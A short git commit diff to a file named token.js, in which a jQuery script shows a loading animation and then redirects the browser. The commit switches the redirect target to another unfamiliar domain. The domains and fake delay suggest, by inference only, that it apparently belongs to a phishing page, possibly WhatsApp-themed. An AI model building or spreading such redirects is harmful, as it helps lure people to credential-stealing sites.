a155a80530c7b527c8b7139708f8a4fa29f664e1
dodypribadi5 <dodypribadi5@gmail.com>
2025-02-18 19:38:27 +0700

    Update token.js

--- token.js
+++ token.js
@@ -5,7 +5,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://choreoapps.ll-feed.cfd/wa/v4-remi';
+location.href='https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/wa/v4-remi';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
